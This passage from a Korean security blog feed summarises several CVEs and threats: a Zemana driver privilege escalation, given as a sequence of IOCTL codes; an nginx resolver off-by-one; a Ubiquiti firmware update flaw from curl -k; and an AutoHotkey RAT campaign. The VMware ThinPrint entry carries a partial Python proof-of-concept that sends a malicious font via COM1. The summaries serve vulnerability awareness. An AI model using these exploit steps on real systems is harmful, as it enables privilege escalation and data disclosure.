&#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xC758; ring0 &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD574; &#xC2DC;&#xC2A4;&#xD15C; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xC2E4;&#xD589; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>IOCTL <code>0x80002010</code>&#xC73C;&#xB85C; <code>\.\ZemanaAntiMalware</code> &#xC5D0; &#xB300;&#xD55C; &#xD578;&#xB4E4;&#xC744; &#xAC00;&#xC838;&#xC634;</li><li>IOCTL <code>0x80002040</code>&#xC73C;&#xB85C; NonPagedPool&#xC5D0; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9;</li><li><code>SystemBigPoolInformation</code>&#xB85C; &#xD560;&#xB2F9;&#xB41C; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC; &#xAC80;&#xC0C9;</li><li>IOCTL <code>0x80002044</code>&#xB85C; miniport &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xAD6C;&#xC131;</li><li>IOCTL <code>0x80002014</code> &#xB610;&#xB294; <code>0x80002018</code>&#xB85C; &#xD574;&#xCEE4;&#xAC00; &#xC815;&#xC758;&#xD55C; miniport &#xB4DC;&#xB77C;&#xC774;&#xBC84; &#xC2E4;&#xD589;</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>lpe</tag>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>local privilege escalation</tag>
      
      <tag>kernel driver</tag>
      
      <tag>antimalware</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-23017: nginx DNS Resolver Off-by-One Heap Write Vulnerability</title>
    <link href="/2021/05/27/idioth/2021-05-27/"/>
    <url>/2021/05/27/idioth/2021-05-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://x41-dsec.de/lab/advisories/x41-2021-002-nginx-resolver-copy/">Advisory X41-2021-002: nginx DNS Resolver Off-by-One Heap Write Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>nginx 0.6.18 - 1.20.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC624;&#xD508; &#xC18C;&#xC2A4; &#xC6F9; &#xC11C;&#xBC84; &#xD504;&#xB85C;&#xADF8;&#xB7A8; nginx&#xC758; <code>ngx_resolver_copy()</code>&#xC5D0;&#xC11C; DNS response&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xB3D9;&#xC548; &#xBC1C;&#xC0DD;&#xD558;&#xB294; off-by-one&#xC73C;&#xB85C; &#xC778;&#xD574; heap &#xC601;&#xC5ED;&#xC758; 1-byte &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>ngx_resolver_copy()</code>&#xB294; DNS response&#xC5D0; &#xD3EC;&#xD568;&#xB41C; DNS &#xB3C4;&#xBA54;&#xC778; &#xC774;&#xB984;&#xC758; &#xC720;&#xD6A8;&#xC131;&#xC744; &#xAC80;&#xC0AC;&#xD558;&#xACE0; &#xC555;&#xCD95;&#xC744; &#xD574;&#xC81C;&#xD558;&#xB294; &#xC791;&#xC5C5;&#xC744; &#xB2E4;&#xC74C; &#xB450; &#xB2E8;&#xACC4;&#xB85C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</p><ol><li>&#xC555;&#xCD95;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xB3C4;&#xBA54;&#xC778; &#xC774;&#xB984; &#xD06C;&#xAE30;&#xC778; <code>len</code>&#xC744; &#xACC4;&#xC0B0;&#xD558;&#xACE0; 128 &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xB118;&#xC5B4;&#xAC00;&#xAC70;&#xB098; &#xBC84;&#xD37C;&#xC758; &#xBC94;&#xC704;&#xB97C; &#xBC97;&#xC5B4;&#xB098;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xBC84;&#xB9BD;&#xB2C8;&#xB2E4;.</li><li>Output buffer&#xB97C; &#xD560;&#xB2F9;&#xD558;&#xACE0; &#xC555;&#xCD95;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC774;&#xB984;&#xC744; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.</li></ol><p>&#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; 1&#xBC88;&#xC758; <code>len</code>&#xACFC; 2&#xBC88;&#xC5D0; &#xC555;&#xCD95;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC774;&#xB984;&#xC758; &#xD06C;&#xAE30;&#xAC00; &#xB2EC;&#xB77C; <code>name-&gt;data</code>&#xC5D0;&#xC11C; 1 &#xBC14;&#xC774;&#xD2B8;&#xB97C; &#xBC97;&#xC5B4;&#xB098; &#xB36E;&#xC5B4;&#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>nginx DNS response&#xB97C; &#xBC1B;&#xAE30; &#xC704;&#xD574; DNS request&#xB97C; &#xBCF4;&#xB0B8; &#xD6C4;, <code>QNAME</code>, <code>NAME</code>, <code>RDATA</code> &#xC911; &#xD558;&#xB098;&#xC758; &#xAC12;&#xC744; &#xD1B5;&#xD574; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; <code>CNAME</code>&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xACBD;&#xC6B0; &#xC7AC;&#xADC0;&#xC801;&#xC73C;&#xB85C; &#xCC98;&#xB9AC;&#xB418;&#xC5B4; <code>ngx_resolve_name_locked()</code>&#xAC00; &#xD638;&#xCD9C;&#xB420; &#xB54C; &#xCD94;&#xAC00;&#xC801;&#xC778; OOB write&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xACE0; <code>ngx_resolver_dup()</code>&#xACFC; <code>ngx_crc32_short()</code>&#xB97C; &#xD1B5;&#xD574; OOB read&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC758; POC &#xCF54;&#xB4DC;&#xB294; <a href="https://github.com/x41sec/advisories/blob/master/X41-2021-002/poc.py">github</a>&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>idioth</tag>
      
      <tag>oob read</tag>
      
      <tag>dns resolver</tag>
      
      <tag>oob write</tag>
      
      <tag>nginx</tag>
      
      <tag>dns</tag>
      
      <tag>off-by-one</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-22909: Ubiquiti 라우터 펌웨어 업데이트 취약점</title>
    <link href="/2021/05/26/fabu1ous/2021-05-26/"/>
    <url>/2021/05/26/fabu1ous/2021-05-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/5/24/cve-2021-22909-digging-into-a-ubiquiti-firmware-update-bug">CVE-2021-22909- DIGGING INTO A UBIQUITI FIRMWARE UPDATE BUG</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Ubiquiti EdgeRouter</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>CVE-2021-22909&#xC5D0; &#xB300;&#xD55C; &#xD328;&#xCE58;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;. Ubiquiti EdgeRouter&#xC758; &#xD38C;&#xC6E8;&#xC5B4; &#xC5C5;&#xB370;&#xC774;&#xD2B8; &#xC791;&#xC5C5;&#xC5D0; MiTM(man-in-the-middle) &#xACF5;&#xACA9;&#xC5D0; &#xB300;&#xD55C; &#xBC29;&#xC9C0; &#xBD80;&#xC7AC;&#xB85C; &#xC778;&#xD574; &#xB77C;&#xC6B0;&#xD130; &#xAE30;&#xAE30;&#xC5D0; &#xC545;&#xC131; &#xD38C;&#xC6E8;&#xC5B4; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xC124;&#xCE58;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; &#xC774;&#xB97C; &#xC545;&#xC6A9;&#xD574; &#xB77C;&#xC6B0;&#xD130; &#xAE30;&#xAE30;&#xC5D0; &#xC545;&#xC131; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xC124;&#xCE58;&#xD560; &#xC218; &#xC788;&#xACE0; root &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>Ubiquiti EdgeRouter&#xB294; templated operational command&#xB97C; &#xC9C0;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;. Templated operational command&#xB780; &#xB77C;&#xC6B0;&#xD130;&#xC758; &#xC124;&#xC815;&#xC744; &#xBE60;&#xB974;&#xACE0; &#xAC04;&#xD3B8;&#xD558;&#xAC8C; &#xC218;&#xC815;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xC9DC;&#xC778; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xC2E4;&#xD589; &#xBA85;&#xB839;&#xC5B4;&#xC785;&#xB2C8;&#xB2E4;. &#xC720;&#xC800;&#xAC00; CLI&#xC5D0; <code>add system image</code>&#xB97C; &#xC785;&#xB825;&#xD558;&#xBA74; <code>ubnt-fw-latest</code> &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xC5B4; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>unbt-fw-latest</code> &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB294; <code>upgrade_firmware()</code>&#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574; Ubiquiti update server&#xB85C;&#xBD80;&#xD130; &#xB2E4;&#xC6B4; &#xB85C;&#xB4DC; URL&#xC744; &#xD3EC;&#xD568;&#xD55C; &#xCD5C;&#xC2E0; &#xD38C;&#xC6E8;&#xC5B4; &#xC815;&#xBCF4;&#xB97C; &#xBC1B;&#xC544;&#xC635;&#xB2C8;&#xB2E4;. &#xADF8; &#xD6C4; &#xBC1B;&#xC544;&#xC628; &#xC815;&#xBCF4;&#xB97C; &#xD30C;&#xC2F1; &#xD574; &#xD604;&#xC7AC; &#xD38C;&#xC6E8;&#xC5B4; &#xBC84;&#xC804;&#xACFC; &#xBE44;&#xAD50;&#xD558;&#xACE0; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xBA74; <code>ubnt-upgrade</code> &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;&#xD574; &#xC81C;&#xACF5;&#xBC1B;&#xC740; url&#xB85C;&#xBD80;&#xD130; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xC124;&#xCE58;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>ubnt-upgrade</code> &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; &#xD638;&#xCD9C;&#xD558;&#xB294; <code>get_tar_by_url()</code> &#xD568;&#xC218;&#xB294; curl &#xCEE4;&#xB9E8;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xC124;&#xCE58;&#xD558;&#xB294;&#xB370; -k &#xC635;&#xC158;(TLS &#xC778;&#xC99D;&#xC11C; &#xAC80;&#xC99D; &#xBE44;&#xD65C;&#xC131;&#xD654;)&#xC774; &#xC124;&#xC815;&#xB418;&#xC5B4;&#xC788;&#xC5B4; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; MITM&#xC73C;&#xB85C; &#xC790;&#xC2E0;&#xC758; &#xB3C4;&#xBA54;&#xC778;&#xC744; &#xC18D;&#xC5EC; &#xB77C;&#xC6B0;&#xD130;&#xC5D0; &#xC545;&#xC131; &#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xC124;&#xCE58;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs powershell">get_tar_by_url () {     mkdir <span class="hljs-variable">$TMP_DIR</span>     <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$NOPROMPT</span>&quot;</span> -<span class="hljs-type">eq</span> <span class="hljs-number">0</span> ]; then         <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Trying to get upgrade file from <span class="hljs-variable">$TAR</span>&quot;</span>     fi       <span class="hljs-keyword">if</span> [ -<span class="hljs-type">n</span> <span class="hljs-string">&quot;<span class="hljs-variable">$USERNAME</span>&quot;</span> ]; then         auth=<span class="hljs-string">&quot;-u <span class="hljs-variable">$USERNAME:</span><span class="hljs-variable">$PASSWORD</span>&quot;</span>     <span class="hljs-keyword">else</span>         auth=<span class="hljs-string">&quot;&quot;</span>     fi       filename=<span class="hljs-string">&quot;<span class="hljs-variable">$</span>{TMP_DIR}/<span class="hljs-variable">$</span>{TAR##*/}&quot;</span>     <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$NOPROMPT</span>&quot;</span> -<span class="hljs-type">eq</span> <span class="hljs-number">0</span> ]; then         <span class="hljs-built_in">curl</span> <span class="hljs-literal">-k</span> <span class="hljs-variable">$auth</span> <span class="hljs-operator">-f</span> <span class="hljs-literal">-L</span> <span class="hljs-literal">-o</span> <span class="hljs-variable">$filename</span> <span class="hljs-variable">$TAR</span>      <span class="hljs-comment"># &lt;-----  </span>    <span class="hljs-keyword">else</span>         <span class="hljs-built_in">curl</span> <span class="hljs-literal">-k</span> <span class="hljs-variable">$auth</span> <span class="hljs-operator">-f</span> <span class="hljs-literal">-s</span> <span class="hljs-literal">-L</span> <span class="hljs-literal">-o</span> <span class="hljs-variable">$filename</span> <span class="hljs-variable">$TAR</span>   <span class="hljs-comment"># &lt;----- </span>    fi     <span class="hljs-keyword">if</span> [ <span class="hljs-variable">$</span>? -<span class="hljs-type">ne</span> <span class="hljs-number">0</span> ]; then         <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Unable to get upgrade file from <span class="hljs-variable">$TAR</span>&quot;</span>         <span class="hljs-built_in">rm</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$filename</span>         <span class="hljs-built_in">rm</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$DOWNLOADING</span>         <span class="hljs-keyword">exit</span> <span class="hljs-number">1</span>     fi       <span class="hljs-keyword">if</span> [ ! -<span class="hljs-type">e</span> <span class="hljs-variable">$filename</span> ]; then         <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Download of <span class="hljs-variable">$TAR</span> failed&quot;</span>         <span class="hljs-built_in">rm</span> <span class="hljs-operator">-f</span> <span class="hljs-variable">$DOWNLOADING</span>         <span class="hljs-keyword">exit</span> <span class="hljs-number">1</span>     fi       <span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$NOPROMPT</span>&quot;</span> -<span class="hljs-type">eq</span> <span class="hljs-number">0</span> ]; then         <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Download succeeded&quot;</span>     fi       TAR=<span class="hljs-variable">$filename</span> }</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misconfiguration</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>router</tag>
      
      <tag>firmware patch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-21987: VMWare Workstation 가상 프린터의 OOB read 취약점</title>
    <link href="/2021/05/25/l0ch/2021-05-25/"/>
    <url>/2021/05/25/l0ch/2021-05-25/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/houjingyi233/my-bugs/tree/main/CVE-2021-21987-vmware-out-of-bounds%20read%20vulnerability%20via%20Cortado%20ThinPrint">CVE-2021-21987-vmware-out-of-bounds read vulnerability via Cortado ThinPrint</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>VMware Workstation 16.1.2 &#xC774;&#xC804;</li><li>Horizon Client 5.5.2 &#xC774;&#xC804;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>VMWare Workstation &#xBC0F; Windows&#xC6A9; Horizon Client&#xC5D0; &#xC124;&#xCE58;&#xB41C; Windows 10&#xC758; &#xAC00;&#xC0C1; &#xD504;&#xB9B0;&#xD130; &#xAD6C;&#xC131;&#xC694;&#xC18C;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB41C; &#xBC94;&#xC704;&#xB97C; &#xBC97;&#xC5B4;&#xB09C; &#xC77D;&#xAE30;(Out-of-Bound Read) &#xCDE8;&#xC57D;&#xC810;&#xC758; PoC&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>VMWare&#xC758; &#xAC00;&#xC0C1; &#xD504;&#xB9B0;&#xD130;&#xC778; ThinPrint &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xB294; &#xAC8C;&#xC2A4;&#xD2B8; Windows&#xC5D0;&#xC11C; &#xBB38;&#xC11C; &#xBC0F; &#xC774;&#xBBF8;&#xC9C0;&#xB97C; &#xD30C;&#xC2F1;&#xD574; &#xD638;&#xC2A4;&#xD2B8; OS&#xC5D0; &#xC5F0;&#xACB0;&#xB41C; &#xD504;&#xB9B0;&#xD130;&#xB85C; &#xCD9C;&#xB825;&#xD560; &#xC218; &#xC788;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xC9C0;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC740; <code>rundll32.exe</code>&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xB418;&#xB294; <code>TPView.dll</code>&#xC774; &#xD3F0;&#xD2B8; &#xD655;&#xC7A5;&#xC790; <code>TrueType Font(TTF)</code>&#xB97C; &#xD30C;&#xC2F1;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xBA70; TTF &#xD30C;&#xC77C;&#xC758; &#xAC80;&#xC99D;&#xC774; &#xCDA9;&#xBD84;&#xD788; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xC9C0; &#xC54A;&#xC544; &#xD574;&#xCEE4;&#xC758; &#xC545;&#xC131; TTF &#xD30C;&#xC77C;&#xC744; &#xD30C;&#xC2F1;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC77D;&#xC5B4; &#xC815;&#xBCF4; &#xC720;&#xCD9C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xB294; COM1 &#xD3EC;&#xD2B8;&#xC758; &#xAC00;&#xC0C1; &#xD504;&#xB9B0;&#xD130;&#xB97C; &#xD65C;&#xC131;&#xD654;&#xD558;&#xACE0; &#xC545;&#xC131; TTF &#xD30C;&#xC77C;&#xC744; &#xC804;&#xB2EC;&#xD558;&#xB294; PoC&#xC758; &#xC77C;&#xBD80;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TPVM</span>:</span>SERIAL_PORT=<span class="hljs-string">b&apos;\\\\\\\\.\\\\COM1&apos;</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span>        self.hPort=windll.kernel32.CreateFileA(self.SERIAL_PORT,                                               <span class="hljs-number">0xc0000000</span>, <span class="hljs-comment"># GENERIC_READ | GENERIC_WRITE</span>                                               <span class="hljs-number">3</span>,          <span class="hljs-comment"># FILE_SHARE_READ | FILE_SHARE_WRITE</span>                                               <span class="hljs-literal">None</span>,                                               <span class="hljs-number">3</span>,          <span class="hljs-comment"># OPEN_EXISTING</span>                                               <span class="hljs-number">0</span>,                                               <span class="hljs-literal">None</span>)        <span class="hljs-keyword">if</span> (self.hPort &amp; <span class="hljs-number">0xffffffff</span>) == <span class="hljs-number">0xffffffff</span>:            <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;the serial port could not be opened (0x%08x)&apos;</span>%(GetLastError()))        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> windll.kernel32.SetupComm(self.hPort, <span class="hljs-number">0x20000</span>, <span class="hljs-number">0x84d0</span>):            <span class="hljs-keyword">raise</span> WinError()...t = TPVM()...f = open(<span class="hljs-string">&quot;poc.ttf&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)font_data = f.read()f.close()emri_engine_font = struct.pack(<span class="hljs-string">&apos;&lt;IIIII&apos;</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">8</span> + FONT_COUNT * <span class="hljs-number">4</span> + len(font_data) + <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, FONT_COUNT, len(font_data))emri_engine_font += binascii.a2b_hex(<span class="hljs-string">&apos;00000000&apos;</span>)emri_engine_font += font_data<span class="hljs-comment"># Put it all together.</span>data_plaintext = devmode + emfspool_hdr + emf + emri_metafile_ext + emri_engine_fontdata_compressed = zlib.compress(data_plaintext, <span class="hljs-number">9</span>)print_command = struct.pack(<span class="hljs-string">&apos;&lt;H&apos;</span>, <span class="hljs-number">0</span>) + struct.pack(<span class="hljs-string">&apos;&lt;II&apos;</span>, len(data_compressed), len(data_plaintext)) + data_compressed<span class="hljs-comment"># Send the printing command.</span>t.do_data(print_command)t.do_command(<span class="hljs-number">0x8002</span>)t.close()</code></pre><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC9C0;&#xB09C; 2016&#xB144; Google Project Zero&#xAC00; &#xBC1C;&#xACAC;&#xD55C; <a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=849">CVE-2016-7083</a> &#xACFC; &#xC720;&#xC0AC;&#xD55C; &#xAC83;&#xC73C;&#xB85C; &#xC54C;&#xB824;&#xC84C;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>oob read</tag>
      
      <tag>out-of-bounds</tag>
      
      <tag>vmware</tag>
      
      <tag>L0ch</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] AutoHotkey 기반 악성코드 공격 주의</title>
    <link href="/2021/05/24/idioth/2021-05-24/"/>
    <url>/2021/05/24/idioth/2021-05-24/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://thehackernews.com/2021/05/experts-warn-about-ongoing-autohotkey.html">Experts Warn About Ongoing AutoHotkey-Based Malware Attacks</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC5EC;&#xB7EC; &#xC0AC;&#xC774;&#xBC84; &#xBCF4;&#xC548; &#xC5F0;&#xAD6C;&#xC6D0;&#xB4E4;&#xC774; Microsoft Windows&#xB97C; &#xD0C0;&#xAE43;&#xC73C;&#xB85C; &#xD55C; Revenge RAT, LimeRAT, AsyncRAT, Houdini, Vjw0rm &#xB4F1;&#xC758; RAT&#xC5D0; AutoHotkey(AHK) &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xC5B8;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC774; &#xBC1C;&#xACAC;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><a href="https://www.autohotkey.com/">AutoHotkey(AHK)</a>&#xB294; Windows &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC5D0;&#xC11C; &#xB9E4;&#xD06C;&#xB85C;, &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xC790;&#xB3D9;&#xD654; &#xB4F1;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xC624;&#xD508; &#xC18C;&#xC2A4; &#xCEE4;&#xC2A4;&#xD140; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xC5B8;&#xC5B4;&#xC785;&#xB2C8;&#xB2E4;.</p><p>AHK &#xC545;&#xC131; &#xD30C;&#xC77C;&#xC740; <code>FileInstall</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; AHK &#xC778;&#xD130;&#xD504;&#xB9AC;&#xD130;, AHK &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;, &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xC5EC; &#xB3C5;&#xB9BD;&#xC801;&#xC778; &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xC81C;&#xC791;&#xC790;&#xB4E4;&#xC740; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC73C;&#xB85C; &#xC704;&#xC7A5;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC545;&#xC131; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC640; &#xC815;&#xC0C1;&#xC801;&#xC778; &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xBB36;&#xC5B4;&#xC11C; &#xC545;&#xC131; &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xC744; &#xC0DD;&#xC131;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. RAT &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xAC10;&#xC5FC;&#xC740; AHK &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xC2DC;&#xC791;&#xB418;&#xBA70; &#xACF5;&#xACA9; &#xCCB4;&#xC778;&#xACFC; &#xC0C1;&#xAD00;&#xC5C6;&#xC774; VBScript&#xB97C; &#xB4DC;&#xB86D;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD558;&#xC5EC; RAT &#xD30C;&#xC77C;&#xC744; &#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;.</p><p>3&#xC6D4; 31&#xC77C;&#xC5D0; &#xBC1C;&#xACAC;&#xB41C; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB294; AHK &#xC2E4;&#xD589; &#xD30C;&#xC77C;&#xC744; &#xD1B5;&#xD574; RAT &#xD30C;&#xC77C;&#xC744; &#xB4DC;&#xB86D;&#xD558;&#xACE0; &#xBC30;&#xCE58; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xD1B5;&#xD574; Microsoft Defender&#xB97C; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610; &#xB2E4;&#xB978; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB294; &#xD53C;&#xD574;&#xC790;&#xC758; <a href="https://en.wikipedia.org/wiki/Hosts_(file">hosts &#xD30C;&#xC77C;</a>)&#xC744; &#xBCC0;&#xC870;&#xD558;&#xC5EC; &#xC720;&#xBA85;&#xD55C; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB4E4;&#xC774; &#xC811;&#xADFC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xB9C9;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xB2E4;&#xB978; &#xC545;&#xC131;&#xCF54;&#xB4DC;&#xB4E4; &#xB610;&#xD55C; AHK &#xC2E4;&#xD589; 